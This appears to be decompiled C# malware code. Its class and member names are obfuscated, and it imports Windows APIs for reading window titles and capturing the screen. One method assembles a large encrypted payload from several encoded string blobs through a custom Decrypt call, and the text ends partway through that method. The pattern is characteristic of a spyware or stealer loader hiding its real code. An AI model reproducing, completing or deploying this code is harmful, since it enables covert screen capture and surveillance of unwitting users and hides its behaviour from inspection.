using System;
using System.Collections;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class CMwZlOmaLXgKVpu
{
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetAncestor(int hwnd, int gaFlags);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int HWnd, StringBuilder lpString, int cch);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetClassNameA(IntPtr HWnd, IntPtr lpClassName, int nMaxCount);

	[DllImport("Gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

	[DllImport("Gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr CreateCompatibleDC(IntPtr hDC);

	[DllImport("Gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int Width, int Height);

	[DllImport("Gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hgdiobj);

	[DllImport("gdi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool DeleteDC(IntPtr hdc);

	[DllImport("gdi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool DeleteObject(IntPtr handle);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetDC(int hWnd);

	public static object HeEErdnqxMbJhJw(byte[] qXbqqAnJvo5L6Y3cHY, string qWrEwlFfxusj3J7ts44g)
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(_003CModule_003E.Decrypt("ᥨ\u1979ᥝ\u193c\u1975\u1934ᥜ᥆ᥨᥣ\u193c\u193bᥨᥣ\u197d\u1926ᥨᥣ\u197d\u193bᥨᥕᥡ\u193bᥨᥧ᥇\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193b\u1978ᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193b\u1926ᥣ\u197d\u193bᥨᥢᥤᥗ\u1943᥄ᥥ\u193b\u1941ᥢ\u1943᥅ᥠ\u1977᥇\u193a\u1975ᥦᥨ\u196f\u1977\u1978\u1941ᥧ\u193aᥗ\u197f\u197c\u193a\u1942ᥣᥥ\u193a\u1943\u197bᥣᥠ\u1979\u193e\u196f\u193b\u1942ᥧ\u197d\u193a\u197d\u197f\u196e\u193e\u1938\u197f\u197e\u193a\u1926ᥤᥬ\u1939\u1926ᥤᥬ\u197b\u197eᥣ\u1943ᥠ\u1978ᥫ\u197d\u193e\u1979\u1926ᥢᥥ\u1939ᥨ᥈ᥣᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197f᥆\u197b\u193e\u197d\u193b\u1975ᥣ\u1979\u1934ᥨᥥᥜ\u193fᥪ᥀ᥩ\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥡ\u197d\u193bᥤ᥇\u1978᥋ᥨ\u1939᥏\u193bᥨᥢ\u1938\u193bᥨᥣ\u197cᥞᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥬ᥆\u193c\u193bᥨᥣ\u197cᥬᥨᥣ\u197d\u193b\u1978ᥣ\u197d\u193bᥨᥣ\u197c\u193bᥨᥣ\u197cᥬᥨᥣ\u197d\u193bᥫ᥅\u197d\u193bᥫᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u1926ᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197f\u193bᥨᥣ\u197d\u193bᥫ᥅\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u193c\u193bᥨᥣ\u1938\u193bᥨᥢ\u197d\u193bᥨᥢ\u197d\u193bᥨᥣ\u197d\u193bᥤᥣ\u197d\u193bᥤᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥢ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥪ\u193b\u1979ᥨᥣ\u197fᥟᥨᥣ\u197d\u193bᥨ\u1979\u197d\u193bᥨᥠ᥇\u1935ᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨ\u197f\u197d\u193bᥨᥢᥗ\u193bᥨᥣ\u197dᥬᥣᥕ\u197d\u193bᥡᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥠᥣ\u197d\u193bᥪᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥪ\u197d\u197d\u193bᥨ\u197e᥇\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨ\u197cᥧ\u1978\u193e\u1922\u1941\u1978ᥨᥣ\u197d\u193b\u196fᥢ\u193c\u193bᥨᥣ\u197cᥬᥨᥣ\u197d\u193bᥧᥣ\u197d\u193bᥨᥣ\u1975\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨ\u197d\u197d\u193bᥨ\u1979\u197cᥢ\u193a\u1943\u1922ᥠ\u193bᥩ\u193c\u193bᥨᥢᥗ\u193bᥨᥣ\u197d\u193b\u1978ᥣ\u197d\u193bᥨᥣ\u1975\u193bᥨᥣ\u197cᥜᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197c\u193bᥨᥣ\u197c\u1935\u197c\u1942\u1977\u1979\u193a\u1943\u193c\u193bᥨᥣ\u197dᥤᥫ᥅\u197d\u193bᥨ\u1979\u197d\u193bᥨᥣ\u197d\u1926ᥨᥣ\u197d\u193bᥦᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨᥣ\u197d\u193bᥨ", 6413));
		stringBuilder.Append(_003CModule_003E.Decrypt("\u20fc\u20e2₤\u20e7\u20fc\u20e2₤\u20e7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2\u20d9\u20e0\u20ca\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20e1\u20d8₤\u20f7\u20fc\u20e2₪\u20f7\u20fc\u20e2₤₤\u20e2₧₤\u20f7\u20e2₤\u20d8\u20f7\u20fc\u20e2₥\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20e3\u20d9\u20f6\u20f7\u20fc\u20fd\u20eb\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20fc\u20e2₤\u20f7\u20e2\u20fa₪\u20fd\u20e2₧₤\u20f7\u20fd\u20c1\u20f9\u20fe\u20f3\u20e0\u20e3\u20f7\u20fb\u20d4₪\u20f7\u20fc\u20e2₪\u20f7\u20fc\u20e3\u20de\u20f4\u20d8\u20d6\u20e2\u20f9\u20da\u20e2₤\u20fa\u20dd₧₥\u20f7\u20fc\u20e3\u20c4\u20fa\u20da\u20eb\u20c0₤\u20c8\u20d0₤\u20f7\u20fd\u20c1\u20fb\u20f9\u20ca\u20e2₤\u20fa\u20db\u20f0₦\u20f9\u20fc\u20e2₤\u20fa\u20db₣₽\u20fe\u20d3\u20f7\u20f3\u20f7\u20fc\u20e2₥\u20f8\u20cb\u20d1\u20c8\u20e4\u20f5\u20f7\u20d8\u20f7\u20fc\u20e2₥\u20f8\u20cb\u20d9\u20d3\u20ff\u20f0\u20f3\u20fb\u20f9₡\u20e2₤\u20fa\u20db₣₹\u20f5\u20db\u20e6₹\u20fe\u20fe\u20d1\u20fb\u20fe\u20da\u20e2₤\u20fa\u20db\u20f7\u20df\u20f5\u20cb\u20d1\u20de\u20f4\u20e2\u20fc\u20dd\u20c7\u20d9\u20d9\u20c6\u20f7\u20fc\u20e3\u20d7\u20fd\u20e2\u20c4₤\u20f7\u20fd\u20c1\u20dd\u20f5\u20e7₠\u20c5\u20f7\u20fc\u20e3\u20d7\u20fb₡₹\u20de\u20f4₧\u20d1\u20c7\u20fb₡₹\u20dd\u20fb₦\u20d9\u20de\u20f5\u20d9\u20d8₪\u20f7\u20fc\u20e3\u20d3\u20e1₧\u20c8₪\u20f7\u20fc\u20e3\u20f3\u20de\u20ca\u20e2₤\u20f7\u20f5\u20f7\u20eb\u20f7\u20fc\u20e2₥\u20f8\u20cb\u20dd\u20de\u20f5₧\u20d1\u20f3\u20f4\u20da\u20e2₥\u20f7\u20fa\u20fb\u20de\u20f5\u20d8\u20d7\u20d8\u20ff\u20fc\u20e2₤\u20f7₹\u20e7\u20f3\u20f7\u20fc\u20e2₥\u20fb₦\u20dd\u20fb\u20f4\u20ca\u20e2₤\u20f5\u20de\u20dc\u20c4\u20f7₡\u20e2₤\u20f8\u20db\u20c1\u20de\u20f5₧\u20ff\u20f8\u20d6₹\u20fb\u20cb₧\u20d4\u20d1\u20fb\u20fe₡\u20e2₤\u20fa\u20c2\u20fb\u20c1\u20f7\u20fc\u20e3\u20d7\u20f8\u20cb\u20c5\u20df\u20fa\u20e2\u20c1\u20fb\u20fe\u20ca\u20e2₤\u20fa\u20c2\u20fb\u20c1\u20f7\u20fc\u20e3\u20d7\u20f8\u20cb\u20f7\u20de\u20f5\u20d8\u20d3\u20d8\u20ff\u20fc\u20e2₤\u20f7₹\u20e7\u20f3\u20f7\u20fc\u20e2₥\u20fb₦\u20c1\u20df\u20fa\u20cb\u20e7\u20d5\u20fd\u20e2\u20fa₤\u20f7\u20fd\u20c1\u20df\u20fa₤\u20d8₽\u20f7\u20fc\u20e3\u20d3\u20e1\u20e5\u20e6₥\u20f7\u20fc\u20e3\u20de\u20f5\u20d8\u20d3\u20d8\u20ff\u20fc\u20e2₤\u20f7₹\u20e7\u20f3\u20f7\u20fc\u20e2₥\u20fb₦\u20c5\u20fb\u20f4\u20fc\u20e2₤\u20f5\u20dd\u20fb\u20c3₧\u20de\u20e0\u20e4\u20f7₡\u20e2₤\u20f8\u20db\u20fb\u20d3\u20fb₡₤\u20c8\u20e0\u20fe\u20d1\u20fb\u20f9₡\u20e2₤\u20fa\u20d9\u20d9\u20c4\u20f7\u20fc\u20e3\u20d7\u20f8\u20db\u20eb\u20d3\u20fb₡₤\u20c8\u20eb\u20fe\u20d1\u20fb\u20f9₡\u20e2₤\u20fa\u20d9\u20d9\u20c4\u20f7\u20fc\u20e3\u20d7\u20fb₦\u20d1\u20c3\u20d1\u20c8\u20e2₤\u20f7\u20fc\u20e4\u20e0\u20ff\u20fc\u20e2₤\u20f7₦\u20e7\u20db\u20fb₦\u20eb\u20f3\u20f7\u20e3\u20e2₤\u20f7\u20e2\u20ff₤\u20fd\u20fd\u20d8₤\u20f7\u20fd\u20d1\u20dc\u20fb\u20cb\u20e7\u20d3\u20f9\u20d3\u20ff\u20f3\u20f7\u20fc\u20e2₥₤₧\u20e2₤\u20f7\u20fc\u20e7\u20de\u20fb\u20cb\u20d1\u20de\u20f5\u20f3\u20d9\u20cb\u20f7\u20fc\u20e3\u20d7\u20df\u20fd\u20e7\u20d9\u20fd\u20fd\u20c0₤\u20f7\u20fd\u20d1\u20f5\u20f5₧\u20d4\u20c7\u20f8\u20cb", 8338));
		stringBuilder.Append(_003CModule_003E.Decrypt("℆™ℚⅇ℆ℽ℘℺⅁℣℀℔ℵⅅ№ℝℂ℩ℛℲ№K№ℝ℃⅄ℙKⅅℲℚ⅀ⅅℒℐℝ℃ⅅ№℟ℰℿℙⅆ℞ℚΩ℟ℰℿℙ℃ℰ℩ℜℂℸ℩№ℝℂℶℚⅇⅅΩℷ℃ℵΩ℘℥Ⅎ℻ℚÅ℃ⅅ№ⅇ⅁ℽ℔℺℆ℼ℟™ⅅℿℙ℩ℰℿℙ™℔ℋℜ℃℟ⅅ№ℜ℠ℾℙ℺ℊℹℜ℃℃ⅅ№ℜ℠ℿℙ℃ℾℼΩℸℸ℥№ℝℂℶℙ℺ℚℿℙ™℔ℋℜ℃℥ⅅ№ℜ℠ℿ℔ℹℲℹ℞ℝ℃ⅅ№⅘℆ℒ№ℝ℃⅄ℚⅇℊℿℙK℆℺ℜ℃ℛⅅ№ℜ™ℊℚⅇℂℚℛ℻℃ⅅ℔ℸℰℿℙⅆℵ™ℙK⅘ℿℙⅇ℆™℆ℼ℃ⅆ№Å℞ℾℙ℺℆ℷ℞ℒℾ℣ⅅℹℙ℘ΩℸℸÅ№ℝℂℶℙ℺ℚΩℜ℃℥ⅅ№ℜ℠ℿ℔ℹℲℹ℞ℝ℃ⅅ№⅘℆ℒ№ℝ℃⅄ℚⅇℊℾℚℒℸℒ№ℝℂℶℜ℃ℇⅅ№ℜ℠ℿℚℸℸK№ℝℂℶℾℜ℆ℸℜℜ℡ⅅ№ℜℰ℔ℚⅇℼ℩℃ℜℊℹℜ℃℃ⅅ№ℜ℠Ⅎℚ⅀ⅅ℩ℜ℟ℰℚ℘⅀℃ⅅℛℵℲℊℴ℺℆Ⅎ℘™℞ℒ№ℝ℃⅄ⅅⅆ℃ⅅ№ℝ℆ℿ℔ⅅℸℱ№ℝℂℲℜ℺℆Ⅎ℘™℞ℒ№ℝ℃⅄ⅅⅆ℃ⅅ№ℝ℆ℚ℔℻℃ⅅ℔ℸℱKℚℸℸℐ№ℝℂℶ℘℺ℤℚℝÅ℃ⅅℛℵℛ⅋℘ℒ℠ℱ℃℻ℂ⅄℟ℝ℃ⅅ№ℝ℃ⅅ№℃℡ⅅ№ℝ℁⅂ℕ℻℃ⅅℷ⅀ℋⅅ№ℜℛⅅ№ℝℂ℥№ℝ℃⅄ℿℝ℃ⅅ№℘ℛℶℒ℧ℛ⅄№ℝ℃ⅅℰ⅀℃ⅅ№℆ℑℽ⅋⅘⅀℆⅀⅘№ℜ℉ℽ⅜ℇⅅ№⅜℀⅀℗⅜ℇℂℾ℉ℕ⅄№ℝ℅⅄ℽ⅀ℕ℉ℽ⅜ℑ⅀ℇ⅜℀℃℃℁ℝ⅄℗⅀℃⅄ℼℑℙ⅀ℸℒℒ⅃ℽ⅜℀⅄№℣℃ⅅℿ№℀ℂℸℂℜℂℂℚℂ℃℃ℂ⅊⅄⅘ℑ℆⅄⅘℉ℕℇ⅘ℙℕ⅄⅘⅄℀⅁⅘ℒ℞℞℀℁℅⅀ℼℑℙ⅀ℐÅℕ⅋⅋⅄℃ⅆ℗⅜ℜℇ⅊ℊℋ℀℗℆℅⅀ℒ⅘℄ℂ⅄ℼℇ℁ℇ⅘ℂ℀℁ℼ℗℉ℕ℣ℇ⅄ℇ⅜ℝℂℾ℉ℕ⅄№ℝ℅⅄ℽ⅀ℕ⅄ℒℙℾ⅄⅘ℙ℆ⅇ⅘ℕℕ℉ℽ⅜ℇⅅ№⅜", 8563));
		stringBuilder.Append(_003CModule_003E.Decrypt("\u1f1e\u1f5eἉὂἣ\u1f5e\u1f46\u1f58ὕἈἃἝὛἈἃἝὛἈἃἝὛἈἃ\u1f1fἦἘ\u1f5a\u1f5aἦἘ\u1f5a\u1f5aἦἡἃἝὛἈἃἝὛἈἃἂἸἣἂἩἥἈἃἝὛἈἃἕὛἈἃ\u1f1f\u1f1eἈἃἝὛἉἝ\u1f5cὛἈἃἷὂἈἃ\u1f1fἠ\u1f17Ἇ\u1f5aἣἉὟἇ\u1f5aἪἙἋἷἠ\u1f5aὝἡἚἚἊ\u1f17ἎἧἔἦἺἃἙὛἈἃἜὔἙἣἏἽ\u1f5aἉὂ\u1f1e\u1f5aἉἌ\u1f46\u1f5e\u1f46\u1f5eἁ\u1f5c\u1f1f\u1f5aἝ\u1f5eἈὂἃ\u1f5e\u1f46ἇἘ\u1f5aἉἏἼὙ\u1f46\u1f5eἛὟ\u1f46ἌἌ\u1f17Ἀ\u1f5aἛ\u1f5eἘἽἝἀἜἔἜἜὛ\u1f1fἺἔἘ\u1f17Ἕ\u1f58ἣὂἉ\u1f5aἘ\u1f5eἺ\u1f58ἈἃἎὟὔ\u1f5eἺ\u1f58ἈἃἎὟὔ\u1f5eἺ\u1f58ἈἃἎὟὔ\u1f5eἺὛἉ\u1f17ἆ\u1f5c\u1f1f\u1f5aἋ\u1f5eἢὂἅ\u1f5cἘἵἝ\u1f5eἣἛἉἜἢ\u1f1fἈ\u1f5eἥἝὛἈ\u1f1f\u1f17ἣἕἡἕ\u1f5aἈἃἙὛἈἃἝὛἈἂἷὛἈἃ\u1f1fἚ\u1f1fἦἄἜἜἦ\u1f46Ἔ\u1f1eἌἔἕἈἃἝὛἈἃ\u1f58ὛὟἃἝὛἈ\u1f1e\u1f58ὂἈἃἜἉ\u1f46ἥἝὛἡἃὔὛἈἆἌἯἈἃἜἉ\u1f17Ἀ\u1f5a\u1f1eὙ\u1f46ἇἅ\u1f5aἵἝὛἈἃ\u1f1fὛἅ\u1f5eἝὛἄἃἝὛἈἝ\u1f5eἯ\u1f17ὕἢ\u1f46ἈἃἝὛἮἂἉὛἈἊ\u1f58\u1f5aἈἃἜἉἛἢἏἝ\u1f5eἥἝὛἈἃἝὛἈἃἝὕἈἃἝ\u1f5aἚἌὔὕἁἂἣ\u1f5aἈἃἝὛἉἥἘἙἈἃἕὛἈἃἙὛἈἃἜ\u1f17ἈἃἝὛἋἥἝὛἈἂἻὛἈἃἜἆἈἃἝὛἃἃἝὛἈἂἉὛἈἃἝὂἈἃἝὛἋἥἝὛἈἃ\u1f5cὛἈἃἝ\u1f5aἈἃἝὛἊ\u1f5eἝὛἈἃἙὛἈἃἝὔἈἃἝὛἈ\u1f5eἝὛἈἃἝὛἊἵἝ\u1f5aἈἃἝὛἈἃἜἨἈἘἉὛὔ\u1f5eἜἨἈἄἫὛὔ\u1f5eἜἨἈἄἷὛἠἃἜἨἈἁἁὛἠἃἜἨἈἀἻὛἠἃἜἨἈἃ\u1f5c\u1f5aἅἃἘἨἈἜἿ\u1f5aἁἥἜἨἈ\u1f1fἕ\u1f5aἁἥἜἨἈἙἉ\u1f5a\u1f58ἃἘἬἈἅἯ\u1f5aἜἃἜἬἈἅἝ\u1f5aἜἃἜἬἈἄἯ\u1f5aἜἃἜἬἈἄ\u1f5c\u1f5aἜἃἜἬἈἇἻ\u1f5aἜἃἜἬἈἇἕ\u1f5aἜἃἜἤἈἆἫ\u1f5aἺἥἘἬἈἃἯ\u1f5aἈἃἔἤἈἂ\u1f5cὕἂἃἔἤἈ\u1f1fὔὕὟἥἔἤἈἘ\u1f58ὕὟἥἔἤἈἊἣὕἪ\u1f5eἔἤἈἇἯὕ", 8045));
		stringBuilder.Append(_003CModule_003E.Decrypt("\u2452␦⑬\u2454⑰⑿␤\u242d⑀\u244d⑯\u244f⑰⑸⑇\u242d⑰⑻⑤\u2454⑰⑻\u245b\u242d⑀\u244d⑬\u2454⑰⑺②\u242c⑀\u244d⑬\u2454⑰⑤⑽\u242c⑤⑻⑤\u2454⑰⑧\u245f\u242c④⑻\u2427\u2454⑰②\u245b\u242c⑤⑻⑤\u2454⑰②⑹\u242c⑤⑻⑤\u2454⑰②\u242c\u242c⑤⑻⑤\u2454⑰①⑃\u242c⑤⑻⑤\u2454⑰①⑭\u242c⑤⑻⑤\u2454⑰④\u245b\u242c\u243a\u245d\u2427\u2454⑰⑲␠\u242c\u243a\u245d\u2427\u2454⑰⑼⑱\u242c\u243a\u245d\u2427\u2454⑰⑾\u245f\u242c\u243a\u245d\u2427\u2454⑰⑹\u242c\u242c\u243a\u245d\u2427\u2454⑰⑻⑭\u243e\u243a\u245d\u2427\u2454⑰⑥⑃\u243e\u243a\u245d\u2427\u2454⑰⑤⑭\u243e\u243a\u245d\u2427\u2454⑰⑦⑱\u243e␤␦␣\u2454⑰①⑽\u243e\u2456\u245d␣\u2454⑰⑼⑽\u243e\u2456\u245d␣\u2454⑰⑾\u245b\u243e\u2456\u245d␣\u2454⑰⑸\u2453\u243e\u2456\u245d␣\u2454⑰⑻\u2457\u243e⑽\u245d\u243e\u2454⑰⑤\u245b\u243a⑽\u245d\u243e\u2454⑰⑧\u244f\u243a⑽\u245d\u243e\u2454⑰⑦⑇\u243a⑽\u245d\u243e\u2454⑰②⑱\u243a⑽\u245d\u243e\u2454⑰①⑃\u243a⑤⑻⑤\u2454⑰④⑱\u243a⑤⑻⑤\u2454⑰④␠\u243a\u2451\u245d\u243e\u2454⑰⑽⑽\u243a⑤⑻⑤\u2454⑰⑽␤\u243a⑤⑻⑤\u2454⑰⑼⑇\u243a⑤⑻⑥␣⑰⑻⑥␣\u245e\u244d\u242c␣⑰⑻⑥␣⑰␦⑥␢⑰⑻②␣⑰⑻⑥␢⑰⑻②␣\u243a␦⑥␢⑰⑻②␣⑬⑥⑥␣⑰⑻⑥␣⑲\u245f\u245c⑬⑳␡␤␣⑰␦⑥␣⑰⑻⑥␣\u243e⑻⑤\u2459⑸⑤\u2456\u2454\u243a⑻⑥␢⑰⑻⑥␣⑰⑻⑧␣⑰⑺①⑴\u243e␡\u2454⑆⑰⑺\u244f␣⑰⑻⑥␣⑰④⑥␣⑼␠⑺⑂⑲\u2457⑹␣⑼\u244d⑥␣⑰⑻⑥␣\u243e⑻⑤\u2459⑸⑿⑤\u2454\u245d␦⑤\u2459⑰⑻⑥␣⑰⑻⑧␣⑰⑺①⑴\u244c⑺\u2454⑤⑰⑥\u2453␣⑰⑻⑥␣⑰④⑥␣⑼␠⑥␦⑲\u2457\u245f␣⑾⑻⑥␣⑰⑻⑥␣\u243e⑻⑤\u2459⑸⑺⑼\u2457\u2459␦⑤⑃⑰⑻⑥␣⑰⑻⑧␣⑰⑺①⑴⑦\u245c\u2450␡⑰⑥⑥␣⑰⑻⑥␣⑰④⑥␣⑼␠⑧␦⑲⑀\u245f␣⑻␦⑧⑆⑸⑻⑥␣⑰⑻⑤⑄⑰⑻②␣⑁\u245d⑤⑾⑰⑻⑤⑴⑰⑻⑥␣⑰⑻⑥␣⑰␦⑤①⑲\u245d⑥␣⑳\u245d⑤\u2427⑲\u245d⑥␣⑳\u244d⑧\u2456⑲\u245d⑥␣⑳⑻⑧\u2459⑲\u245d⑤⑴⑳␦⑧⑁⑲\u245d⑥␣⑲\u245d⑧⑷⑲\u245d⑥␣⑲\u244d⑧⑾⑲\u245d⑥␣⑲⑻⑧⑺⑲\u245d⑥␣⑲␦⑧④⑲\u245d⑥␣⑽\u245d⑧␤⑲\u245d⑤⑴⑰⑻⑥␣⑰⑻⑥␣⑰␦⑺\u2458⑲\u245d⑥␣⑳\u245d⑺⑇⑲\u245d⑥␣⑰␦⑺⑧⑲\u245d⑥␣⑳\u245d⑺⑭⑲\u245d⑤⑴⑰", 9237));
		stringBuilder.Append(_003CModule_003E.Decrypt("\u171bᜅᝃᜐ\u171bᜅᝃᜐᝆ\u171aᜇ\u1712\u173dᜅᝃ\u1713\u173d\u171a\u170d\u1712\u173dᜅᝃ\u1713ᜭᜅ\u1738\u1712\u173dᜅᝃ\u1713\u171bᜅᜧ\u1712\u173dᜅᝃ\u1713ᝆᜅ\u1714\u1712\u173dᜅᝃᜐᝆᜅᜃ\u1712\u173dᜄ\u1714ᜐ\u171bᜅᝃᜐ\u171bᜅᝃᜐᝆ\u171a\u1738\u1712\u173dᜅᝃ\u1713\u173d\u171aᜧ\u1712\u173dᜅᝃᜐᝆ\u171aᜇ\u1712\u173dᜅᝃ\u1713\u173dᜄᜭ\u1712ᜭᜅᝃ\u1713ᜭᜄ\u1716\u1712ᜭᜅᝃ\u1713\u171bᜄ\u171d\u1712ᜭᜅᝃ\u1713ᝆᜄᜇ\u1712ᜭᜅᝃᜐᝆᜇ\u1737\u1712ᜭᜅᝃ\u1713\u173dᜇ\u173e\u1712ᜭᜅᝃ\u1713ᜭᜇᜠ\u1712ᜭᜅᝃ\u1713\u171bᜇ\u1717\u1712ᜭᜅᝃ\u1713ᝆᜇ\u171a\u1712ᜭᜅᝃᜐᝆᜇ\u1737\u1712ᜭᜅᝃ\u1713\u173d\u171a\u173e\u1712ᜭᜅᝃ\u1713ᜭ\u171aᜬ\u1712ᜭᜅᝃ\u1713\u171b\u171a\u171d\u1712ᜭᜅᝃ\u1713ᝆ\u171a\u171b\u1712ᜭᜅᝃᜐᝆ\u171a\u175e\u1712ᜠᜁᝃ\u1738\u171b\u175e\u173bᜐ\u1712ᜁᝃ\u1738\u171b\u175eᜧᜐᜄ\u173bᝂ\u1738\u171b\u175eᜧᜐᜅ\u173bᝂ\u1738\u171b\u175eᜧᜐᜀ\u173bᝂ\u1738\u171b\u175e\u173bᜐᜄᜁᝂ\u1738\u171b\u175eᜧᜐᜇ\u173bᝂ\u1738\u171b\u175eᜧᜐ\u171f\u173bᝃ\u1738\u171b\u175eᜢᜐᜁ\u173bᝂ\u1738\u171b\u175e\u1716ᜐᜇᜁᝂ\u1738\u171b\u175eᜧᜐ\u1712\u173bᝂ\u1738\u171b\u175eᜧᜐᜃ\u173bᝂ\u1738\u171b\u175e\u171dᜐᜆ\u173bᝂ\u1738\u171b\u175eᜧᜐᜅᜁᝂ\u1738\u171b\u175eᜧᜐ\u171e\u173bᝃ\u1738\u171b\u175e\u173bᜐ\u171d\u173bᝃ\u1738\u171b\u175e\u1718ᜐᜃᜁᝃ\u1738\u171b\u175eᜆᜐᜄ\u173bᝃ\u1738\u171b\u175e\u173bᜐᜇ\u173bᝃ\u1738\u171b\u175e\u173bᜐᜇᜁᝃ\u1738\u171b\u175eᜌᜐᜁᜁᝂ\u1738\u171b\u175e\u173bᜐ\u1712\u173bᝃ\u173a\u173d\u175eᝃᜐᜅ\u173bᝃᜤᜭ\u175e\u175aᜐ\u171bᜁᝂᜦ\u171b\u175aᜰᜐᜁᜁᝃᜡᝆ\u175a\u173dᜐᜁᜁᝃᜣᝆ\u175a\u173aᜐ\u171bᜁᝂ\u1738\u171b\u175e\u1716ᜐ\u171cᜁᝂ\u1738\u171b\u175eᜧᜐ\u171bᜁᝂ\u1738\u171b\u175aᜣᜐ\u171bᜁᝂᜭᝆ\u175a\u1714ᜐᜀᜁᝃ\u1714ᝆ\u175a\u1713ᜐ\u171bᜁᝂᜡᝆ\u175aᜄᜐᜁᜁᝃᜑᜭ\u175aᜀᜐᜅᜁᝃ\u1713\u171aᜱᝅᜐᜅᜁᝃ\u171f\u171aᜱᝃᜐ\u171a\u173bᝂ\u1738\u171b\u175e\u173bᜐᜅᜅᝃ\u171dᜭᜅᜦᜐᜄ\u171dᝃᝄᜭᜄ\u1718ᜐᝃ\u171dᝃᜏᜭᜄ\u173fᜐᝃ\u171dᝃ\u170dᜭᜄᜑᜐᝃ\u171dᝃᝂᜭᜇᜤᜐᝃ\u171dᝃᝀᜭᜅᜭᜐᜄ\u171dᝃᝆᜭᜅᜭᜐᜄ\u171dᝃᜅᜭᜅᜑᜐᜄ\u171dᝃ\u171bᜭᜅᜭᜐᜄ\u171dᝃ\u1719ᜭᜅᜭᜐᜄ\u171dᝃᜃᜭᜄᜠᜐᝃ\u171dᝃᜁᜭᜄ\u173fᜐᝃ\u171dᝃᜇᜭᜅᝍᜐᝆᝄᝃᜰ\u173dᜄ\u173dᜐ\u171d\u1737ᝃ\u171eᝆ\u171aᜤᜐᜅᝄᝃᜰ\u173dᜄᜇᜐ\u171d\u1737ᝃᝃ\u173dᜃᜇᜐᝂ\u1733ᝃᜀ\u171bᜇ\u173dᜐ\u1712ᜁᝂᜐ\u171bᜁ\u175aᜐᜄ᜶\u1734ᜐᝆᜅᝃᜐᝁ\u1733ᝃ\u175eᝁ", 6005));
